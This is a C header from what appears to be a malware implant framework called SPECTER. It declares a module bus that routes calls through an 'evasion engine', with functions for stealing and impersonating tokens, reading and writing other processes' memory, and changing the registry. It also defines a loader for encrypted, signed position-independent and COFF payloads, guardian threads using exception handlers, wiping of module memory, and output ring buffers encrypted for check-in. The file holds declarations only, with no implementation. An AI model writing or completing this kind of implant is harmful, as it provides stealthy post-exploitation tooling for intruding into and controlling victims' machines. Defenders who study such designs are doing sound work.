/**
 * SPECTER Implant — Module Bus API Interface
 *
 * The module bus is the only interface through which modules interact
 * with the implant core.  Modules never make direct syscalls, allocate
 * memory, or talk to the network.  They receive a MODULE_BUS_API
 * function table whose implementations route through the evasion engine.
 */

#ifndef BUS_H
#define BUS_H

#include "specter.h"
#include "ntdefs.h"

/* ------------------------------------------------------------------ */
/*  Output type enumeration                                            */
/* ------------------------------------------------------------------ */

#define OUTPUT_TEXT     0
#define OUTPUT_BINARY   1
#define OUTPUT_ERROR    2

/* ------------------------------------------------------------------ */
/*  Log level enumeration                                              */
/* ------------------------------------------------------------------ */

#define LOG_DEBUG   0
#define LOG_INFO    1
#define LOG_WARN    2
#define LOG_ERROR   3

/* ------------------------------------------------------------------ */
/*  Bus constants                                                      */
/* ------------------------------------------------------------------ */

#define BUS_OUTPUT_RING_SIZE    4096   /* Encrypted ring buffer capacity  */
#define BUS_OUTPUT_ENTRY_MAX    512    /* Max single output write size    */

/* ------------------------------------------------------------------ */
/*  MODULE_BUS_API — function table passed to every module              */
/* ------------------------------------------------------------------ */

/**
 * All function pointers use __cdecl calling convention.
 * Each implementation routes through the evasion engine.
 */
typedef struct _MODULE_BUS_API {
    /* Memory operations */
    PVOID     (*mem_alloc)(SIZE_T size, DWORD perms);
    BOOL      (*mem_free)(PVOID ptr);
    BOOL      (*mem_protect)(PVOID ptr, SIZE_T size, DWORD perms);

    /* Network operations */
    HANDLE    (*net_connect)(const char *addr, DWORD port, DWORD proto);
    BOOL      (*net_send)(HANDLE handle, const BYTE *data, DWORD len);
    DWORD     (*net_recv)(HANDLE handle, BYTE *buf, DWORD len);
    BOOL      (*net_close)(HANDLE handle);

    /* Process operations */
    HANDLE    (*proc_open)(DWORD pid, DWORD access);
    BOOL      (*proc_read)(HANDLE handle, PVOID addr, BYTE *buf, DWORD len);
    BOOL      (*proc_write)(HANDLE handle, PVOID addr, const BYTE *data, DWORD len);
    BOOL      (*proc_close)(HANDLE handle);

    /* Thread operations */
    HANDLE    (*thread_create)(PVOID func, PVOID param, BOOL suspended);
    BOOL      (*thread_resume)(HANDLE handle);
    BOOL      (*thread_terminate)(HANDLE handle);

    /* Token operations */
    HANDLE    (*token_steal)(DWORD pid);
    BOOL      (*token_impersonate)(HANDLE handle);
    BOOL      (*token_revert)(void);
    HANDLE    (*token_make)(const char *user, const char *pass, const char *domain);

    /* File operations */
    DWORD     (*file_read)(const char *path, BYTE *buf, DWORD len);
    BOOL      (*file_write)(const char *path, const BYTE *data, DWORD len);
    BOOL      (*file_delete)(const char *path);
    PVOID     (*file_list)(const char *path);

    /* Registry operations */
    DWORD     (*reg_read)(DWORD hive, const char *path, const char *value);
    BOOL      (*reg_write)(DWORD hive, const char *path, const char *value,
                           const BYTE *data, DWORD type);
    BOOL      (*reg_delete)(DWORD hive, const char *path, const char *value);

    /* Output — module sends results back to implant */
    BOOL      (*output)(const BYTE *data, DWORD len, DWORD type);

    /* Resolve — get a clean function pointer for a DLL export */
    PVOID     (*resolve)(const char *dll_name, const char *func_name);

    /* Logging */
    void      (*log)(DWORD level, const char *msg);
} MODULE_BUS_API;

/* ------------------------------------------------------------------ */
/*  Output ring buffer — encrypted circular buffer for module output    */
/* ------------------------------------------------------------------ */

typedef struct _OUTPUT_RING {
    BYTE    data[BUS_OUTPUT_RING_SIZE]; /* Ring buffer storage           */
    DWORD   head;                       /* Write position                */
    DWORD   tail;                       /* Read position                 */
    DWORD   count;                      /* Bytes currently buffered      */
    BYTE    enc_key[32];                /* ChaCha20 encryption key       */
    BYTE    enc_nonce[12];              /* ChaCha20 nonce                */
    BOOL    encrypted;                  /* Whether data is encrypted     */
} OUTPUT_RING;

/* ------------------------------------------------------------------ */
/*  BUS_CONTEXT — module bus state                                      */
/* ------------------------------------------------------------------ */

typedef struct _BUS_CONTEXT {
    MODULE_BUS_API  api;            /* Function table for modules        */
    OUTPUT_RING     output_ring;    /* Encrypted output ring buffer      */
    PVOID           implant_ctx;    /* Back-pointer to IMPLANT_CONTEXT   */
    BOOL            initialized;    /* Bus initialized flag              */
} BUS_CONTEXT;

/* ------------------------------------------------------------------ */
/*  Bus API                                                            */
/* ------------------------------------------------------------------ */

/**
 * Initialize the module bus: populate function table, init output ring.
 * Stores BUS_CONTEXT pointer in ctx->module_bus.
 */
NTSTATUS bus_init(IMPLANT_CONTEXT *ctx);

/**
 * Get the module API table pointer (passed to modules at load time).
 */
MODULE_BUS_API *bus_get_api(BUS_CONTEXT *bctx);

/* ------------------------------------------------------------------ */
/*  Output ring buffer API                                             */
/* ------------------------------------------------------------------ */

/**
 * Write data to the encrypted output ring buffer.
 * Data is encrypted with ChaCha20 before storage.
 * Returns TRUE on success, FALSE if buffer full.
 */
BOOL output_write(OUTPUT_RING *ring, const BYTE *data, DWORD len, DWORD type);

/**
 * Drain output from the ring buffer into a plaintext destination.
 * Decrypts data on read. Returns number of bytes drained.
 */
DWORD output_drain(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len);

/**
 * Reset the output ring buffer to empty state with a new key.
 */
void output_reset(OUTPUT_RING *ring);

/**
 * Return the number of bytes available to read from the ring.
 */
DWORD output_available(const OUTPUT_RING *ring);

/* ------------------------------------------------------------------ */
/*  Module loader constants                                            */
/* ------------------------------------------------------------------ */

#define MODULE_MAGIC            0x43455053  /* "SPEC" little-endian     */
#define MODULE_VERSION          1
#define MODULE_MAX_SIZE         (1024 * 1024) /* 1 MB max module size  */

/* Module types */
#define MODULE_TYPE_PIC         0
#define MODULE_TYPE_COFF        1

/* Module status */
#define MODULE_STATUS_LOADING    0
#define MODULE_STATUS_RUNNING    1
#define MODULE_STATUS_COMPLETED  2
#define MODULE_STATUS_CRASHED    3
#define MODULE_STATUS_WIPED      4

/* COFF relocation types (IMAGE_REL_AMD64_*) */
#define IMAGE_REL_AMD64_ABSOLUTE  0x0000
#define IMAGE_REL_AMD64_ADDR64    0x0001
#define IMAGE_REL_AMD64_ADDR32NB  0x0003
#define IMAGE_REL_AMD64_REL32     0x0004
#define IMAGE_REL_AMD64_REL32_1   0x0005
#define IMAGE_REL_AMD64_REL32_2   0x0006
#define IMAGE_REL_AMD64_REL32_3   0x0007
#define IMAGE_REL_AMD64_REL32_4   0x0008
#define IMAGE_REL_AMD64_REL32_5   0x0009

/* COFF section characteristics */
#define IMAGE_SCN_CNT_CODE              0x00000020
#define IMAGE_SCN_CNT_INITIALIZED_DATA  0x00000040
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080
#define IMAGE_SCN_MEM_EXECUTE           0x20000000
#define IMAGE_SCN_MEM_READ              0x40000000
#define IMAGE_SCN_MEM_WRITE             0x80000000

/* COFF symbol storage classes */
#define IMAGE_SYM_CLASS_EXTERNAL   2
#define IMAGE_SYM_CLASS_STATIC     3
#define IMAGE_SYM_CLASS_LABEL      6

/* COFF symbol section numbers */
#define IMAGE_SYM_UNDEFINED        0

/* COFF machine types */
#define IMAGE_FILE_MACHINE_AMD64   0x8664

/* Max external symbol resolutions for COFF */
#define COFF_MAX_SYMBOLS           256
#define COFF_MAX_SECTIONS          32

/* PIC entry signature: function(MODULE_BUS_API *api, BYTE *args, DWORD args_len) */
typedef DWORD (*PIC_ENTRY_FN)(MODULE_BUS_API *api, BYTE *args, DWORD args_len);

/* COFF entry: same signature but resolved from "go" or "_go" symbol */
typedef DWORD (*COFF_ENTRY_FN)(MODULE_BUS_API *api, BYTE *args, DWORD args_len);

/* ------------------------------------------------------------------ */
/*  MODULE_PACKAGE — wire format for module delivery                   */
/* ------------------------------------------------------------------ */

#pragma pack(push, 1)
typedef struct _MODULE_PACKAGE_HDR {
    DWORD magic;             /* MODULE_MAGIC ("SPEC")                  */
    DWORD version;           /* MODULE_VERSION                         */
    DWORD module_type;       /* MODULE_TYPE_PIC or MODULE_TYPE_COFF    */
    DWORD encrypted_size;    /* Size of encrypted payload              */
    BYTE  ephemeral_pubkey[32]; /* Ephemeral X25519 public key         */
    BYTE  signature[64];     /* Ed25519 signature over encrypted data  */
} MODULE_PACKAGE_HDR;
#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  COFF object file structures                                        */
/* ------------------------------------------------------------------ */

#pragma pack(push, 1)
typedef struct _COFF_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} COFF_FILE_HEADER;

typedef struct _COFF_SECTION {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} COFF_SECTION;

typedef struct _COFF_SYMBOL {
    union {
        BYTE  ShortName[8];
        struct {
            DWORD Zeroes;
            DWORD Offset;
        } LongName;
    } Name;
    DWORD Value;
    SHORT SectionNumber;
    WORD  Type;
    BYTE  StorageClass;
    BYTE  NumberOfAuxSymbols;
} COFF_SYMBOL;

typedef struct _COFF_RELOCATION {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD  Type;
} COFF_RELOCATION;
#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  LOADED_MODULE — runtime state for a loaded module                  */
/* ------------------------------------------------------------------ */

typedef struct _LOADED_MODULE {
    DWORD           module_id;       /* Unique module identifier        */
    DWORD           module_type;     /* MODULE_TYPE_PIC / _COFF         */
    PVOID           entry_point;     /* Resolved entry function         */
    PVOID           memory_base;     /* Allocated memory region base    */
    SIZE_T          memory_size;     /* Total allocated region size     */
    HANDLE          guardian_thread; /* Guardian thread handle           */
    DWORD           status;          /* MODULE_STATUS_*                 */
    OUTPUT_RING    *output_ring;     /* Per-module output buffer ref    */
    MODULE_BUS_API *bus_api;         /* Bus API pointer for this module */
} LOADED_MODULE;

/* ------------------------------------------------------------------ */
/*  Loader API                                                         */
/* ------------------------------------------------------------------ */

/**
 * Verify a module package: check magic, version, Ed25519 signature.
 * signing_key: 32-byte Ed25519 public key from implant config.
 * Returns TRUE if package is valid, FALSE otherwise.
 */
BOOL loader_verify_package(const BYTE *package, DWORD package_len,
                           const BYTE signing_key[32]);

/**
 * Decrypt a module package: X25519 key agreement + ChaCha20-Poly1305.
 * implant_privkey: 32-byte X25519 private key from implant config.
 * plaintext_out: caller-allocated buffer for decrypted module data.
 * plaintext_len: in/out — buffer size in, actual size out.
 * Returns TRUE on success (tag verified), FALSE on failure.
 */
BOOL loader_decrypt_package(const BYTE *package, DWORD package_len,
                            const BYTE implant_privkey[32],
                            BYTE *plaintext_out, DWORD *plaintext_len);

/**
 * Load a PIC (position-independent code) blob.
 * Allocates RW memory, copies blob, injects API table pointer at
 * offset 0 (first 8 bytes = pointer to MODULE_BUS_API), flips to RX.
 * Returns entry point on success, NULL on failure.
 */
PVOID loader_load_pic(const BYTE *blob, DWORD blob_len,
                      MODULE_BUS_API *api, LOADED_MODULE *mod);

/**
 * Load a COFF (Common Object File Format) object.
 * Parses headers, processes relocations (ADDR64, ADDR32NB, REL32),
 * resolves external symbols against bus API and Beacon shim names,
 * lays out sections, returns entry point ("go" or "_go" symbol).
 * Returns entry point on success, NULL on failure.
 */
PVOID loader_load_coff(const BYTE *coff_data, DWORD coff_len,
                       MODULE_BUS_API *api, LOADED_MODULE *mod);

/**
 * Parse the package header and return a pointer to it.
 * Returns NULL if package is too small or magic/version invalid.
 */
const MODULE_PACKAGE_HDR *loader_parse_header(const BYTE *package,
                                               DWORD package_len);

/* ------------------------------------------------------------------ */
/*  Guardian thread constants                                          */
/* ------------------------------------------------------------------ */

#define GUARDIAN_MAX_MODULES     8       /* Max concurrent module slots  */
#define GUARDIAN_DEFAULT_TIMEOUT 60000   /* Default wait timeout (60s)   */

/* Windows exception codes */
#define EXCEPTION_ACCESS_VIOLATION      0xC0000005
#define EXCEPTION_STACK_OVERFLOW        0xC00000FD
#define EXCEPTION_INT_DIVIDE_BY_ZERO    0xC0000094
#define EXCEPTION_PRIV_INSTRUCTION      0xC0000096
#define EXCEPTION_ILLEGAL_INSTRUCTION   0xC000001D
#define EXCEPTION_NONCONTINUABLE_EXCEPTION 0xC0000025

/* VEH return codes */
#define EXCEPTION_CONTINUE_EXECUTION    ((LONG)-1)
#define EXCEPTION_CONTINUE_SEARCH       ((LONG)0)

/* ------------------------------------------------------------------ */
/*  Exception structures for VEH                                       */
/* ------------------------------------------------------------------ */

typedef struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
} EXCEPTION_RECORD, *PEXCEPTION_RECORD;

typedef struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PVOID             ContextRecord;     /* CONTEXT64* */
} EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;

/* ------------------------------------------------------------------ */
/*  GUARDIAN_SLOT — per-module guardian state                           */
/* ------------------------------------------------------------------ */

typedef struct _GUARDIAN_SLOT {
    LOADED_MODULE  *module;         /* Pointer to the loaded module      */
    HANDLE          thread;         /* Guardian thread handle             */
    BOOL            active;         /* Slot in use                        */
} GUARDIAN_SLOT;

/* ------------------------------------------------------------------ */
/*  GUARDIAN_CONTEXT — global guardian thread manager state             */
/* ------------------------------------------------------------------ */

typedef struct _GUARDIAN_CONTEXT {
    GUARDIAN_SLOT   slots[GUARDIAN_MAX_MODULES]; /* Module guardian slots */
    DWORD           active_count;   /* Number of active guardian threads  */
    PVOID           veh_handle;     /* VEH registration handle            */
    PVOID           implant_ctx;    /* Back-pointer to IMPLANT_CONTEXT    */
    BOOL            initialized;    /* Guardian system initialized flag   */
} GUARDIAN_CONTEXT;

/* ------------------------------------------------------------------ */
/*  Guardian thread API                                                */
/* ------------------------------------------------------------------ */

/**
 * Initialize the guardian subsystem.  Registers the VEH handler.
 * Returns STATUS_SUCCESS on success.
 */
NTSTATUS guardian_init(IMPLANT_CONTEXT *ctx);

/**
 * Create a guardian thread for a loaded module.
 * Registers VEH, creates thread in suspended state, sets context, resumes.
 * entry_point: module entry function
 * param: parameter passed to the module entry (MODULE_BUS_API*)
 * mod: loaded module structure to associate with the guardian
 * Returns TRUE on success, FALSE on failure.
 */
BOOL guardian_create(PVOID entry_point, PVOID param, LOADED_MODULE *mod);

/**
 * Wait for a guardian thread to complete or timeout.
 * mod: module whose guardian thread to wait on
 * timeout_ms: wait timeout in milliseconds (0 = no wait, check status only)
 * Returns TRUE if module completed (status COMPLETED or CRASHED),
 * FALSE if still running or timeout expired.
 */
BOOL guardian_wait(LOADED_MODULE *mod, DWORD timeout_ms);

/**
 * Forcibly terminate a guardian thread and mark module as CRASHED.
 * mod: module whose guardian thread to kill
 * Returns TRUE if thread was terminated, FALSE on error.
 */
BOOL guardian_kill(LOADED_MODULE *mod);

/**
 * Clean up the guardian subsystem.  Removes VEH handler.
 */
void guardian_shutdown(void);

/* ------------------------------------------------------------------ */
/*  MODULE_MANAGER — lifecycle manager for concurrent modules          */
/* ------------------------------------------------------------------ */

#define MODMGR_MAX_SLOTS    GUARDIAN_MAX_MODULES  /* Max concurrent modules */

typedef struct _MODULE_MANAGER {
    LOADED_MODULE   slots[MODMGR_MAX_SLOTS];      /* Module slot array       */
    OUTPUT_RING     output_rings[MODMGR_MAX_SLOTS];/* Per-module output rings */
    MODULE_BUS_API  slot_apis[MODMGR_MAX_SLOTS];   /* Per-module bus API copy */
    DWORD           active_count;                   /* Active module count     */
    PVOID           implant_ctx;                    /* Back-pointer to ctx     */
    DWORD           next_module_id;                 /* Monotonic module ID     */
    BOOL            initialized;                    /* Manager initialized     */
} MODULE_MANAGER;

/* ------------------------------------------------------------------ */
/*  Module lifecycle API                                               */
/* ------------------------------------------------------------------ */

/**
 * Initialize the module manager.
 * Must be called after bus_init and guardian_init.
 */
NTSTATUS modmgr_init(IMPLANT_CONTEXT *ctx);

/**
 * Execute a module package: verify → decrypt → load → run in guardian.
 * package: raw MODULE_PACKAGE wire data.
 * len: total package length.
 * Returns the module slot index on success, -1 on failure.
 */
int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len);

/**
 * Poll running modules: check status, drain completed output, collect
 * crash info.  Call before each check-in.
 * results_out: caller buffer for aggregated module output.
 * results_len: in/out — buffer capacity in, bytes written out.
 * Returns number of modules that completed or crashed since last poll.
 */
DWORD modmgr_poll(MODULE_MANAGER *mgr, BYTE *results_out, DWORD *results_len);

/**
 * Clean up a completed/crashed module slot: flip memory to RW,
 * zero-fill, decommit, release, zero the slot.
 */
void modmgr_cleanup(MODULE_MANAGER *mgr, DWORD slot);

/**
 * Shut down the module manager: kill all active modules, clean up.
 */
void modmgr_shutdown(MODULE_MANAGER *mgr);

/**
 * Get the global module manager pointer.
 * Used by the task execution engine to route module tasks.
 */
MODULE_MANAGER *modmgr_get(void);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
/**
 * Set the output ring encryption key for deterministic testing.
 */
void bus_test_set_ring_key(OUTPUT_RING *ring, const BYTE key[32],
                           const BYTE nonce[12]);

/**
 * Get the guardian context for testing.
 */
GUARDIAN_CONTEXT *guardian_test_get_context(void);

/**
 * Simulate a module crash for testing.
 */
void guardian_test_simulate_crash(LOADED_MODULE *mod);

/**
 * Simulate module completion for testing.
 */
void guardian_test_simulate_complete(LOADED_MODULE *mod);

/**
 * Get the module manager for testing.
 */
MODULE_MANAGER *modmgr_test_get_manager(void);
#endif

#endif /* BUS_H */
